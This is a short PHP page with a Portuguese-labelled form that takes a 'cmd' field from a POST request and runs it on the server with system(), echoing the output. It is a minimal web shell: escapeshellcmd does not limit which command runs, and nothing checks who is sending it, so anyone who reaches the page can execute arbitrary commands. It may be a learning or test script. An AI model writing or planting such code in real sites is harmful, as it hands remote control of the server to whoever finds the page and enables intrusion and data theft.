<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

	$cmd = escapeshellcmd($_POST['cmd']);

	var_dump($cmd);

	echo "<pre>";

	$comando = system($cmd, $retorno);

	echo "</pre>";

}

?>

<form method="post">
	
	<input type="text" name="cmd">
	<button style="background-color:#ff3" type="submit">Enviar</button>

</form>